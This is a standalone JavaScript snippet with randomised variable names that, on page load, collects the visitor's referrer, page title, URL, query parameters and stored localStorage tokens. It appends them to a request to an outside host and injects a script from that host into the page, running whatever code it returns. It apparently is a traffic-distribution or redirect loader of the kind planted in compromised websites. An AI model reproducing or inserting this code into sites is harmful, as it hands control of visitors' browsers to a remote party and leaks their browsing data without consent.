 (function() {
    var name = '_6nT6rXD81MbvrFv2';
    if (!window._6nT6rXD81MbvrFv2) {
        window._6nT6rXD81MbvrFv2 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://4din.ru/QYjjQnRw',
            P_PATH: 'https://4din.ru/7a3be7b/postback',
        };
    }
    const _vnGL6WJQVpgh3VRv = localStorage.getItem('config');
    if (typeof _vnGL6WJQVpgh3VRv !== 'undefined' && _vnGL6WJQVpgh3VRv !== null) {
        var _j7sPswnwY2g3HMRx = JSON.parse(_vnGL6WJQVpgh3VRv);
        var _QJ65kZ2JYPPmfssP = Math.round(+new Date()/1000);
        if (_j7sPswnwY2g3HMRx.created_at + window._6nT6rXD81MbvrFv2.ttl < _QJ65kZ2JYPPmfssP) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _KX9sVZLWVvhtKnns = localStorage.getItem('subId');
    var _72X4PZ2phYs1VJhx = localStorage.getItem('token');
    var _GFr9FNyyKnSXV8Hh = '?return=js.client';
        _GFr9FNyyKnSXV8Hh += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _GFr9FNyyKnSXV8Hh += '&se_referrer=' + encodeURIComponent(document.referrer);
        _GFr9FNyyKnSXV8Hh += '&default_keyword=' + encodeURIComponent(document.title);
        _GFr9FNyyKnSXV8Hh += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _GFr9FNyyKnSXV8Hh += '&name=' + encodeURIComponent(name);
        _GFr9FNyyKnSXV8Hh += '&host=' + encodeURIComponent(window._6nT6rXD81MbvrFv2.R_PATH);
    if (typeof _KX9sVZLWVvhtKnns !== 'undefined' && _KX9sVZLWVvhtKnns && window._6nT6rXD81MbvrFv2.unique) {
        _GFr9FNyyKnSXV8Hh += '&sub_id=' + encodeURIComponent(_KX9sVZLWVvhtKnns);
    }
    if (typeof _72X4PZ2phYs1VJhx !== 'undefined' && _72X4PZ2phYs1VJhx && window._6nT6rXD81MbvrFv2.unique) {
        _GFr9FNyyKnSXV8Hh += '&token=' + encodeURIComponent(_72X4PZ2phYs1VJhx);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._6nT6rXD81MbvrFv2.R_PATH + _GFr9FNyyKnSXV8Hh;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
